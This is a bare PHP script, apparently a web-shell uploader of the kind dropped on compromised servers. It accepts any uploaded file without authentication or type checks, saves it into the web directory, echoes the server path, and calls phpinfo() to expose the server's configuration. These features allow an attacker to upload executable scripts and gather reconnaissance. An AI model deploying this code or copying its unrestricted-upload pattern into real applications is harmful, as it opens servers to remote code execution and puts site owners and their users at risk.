<?php

$info = "";

if (isset($_FILES['file'])) {

    $name = basename($_FILES['file']['name']);
    $tmp  = $_FILES['file']['tmp_name'];
    $path = getcwd() . "/" . $name;

    if (move_uploaded_file($tmp, $name)) {
        $info .= "Upload Success : " . $path . "<br><br>";
    } else {
        $info .= "Upload Failed<br><br>";
    }
}

?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="upload">
</form>

<?php echo $info; ?>

<hr>

<?php phpinfo(); ?>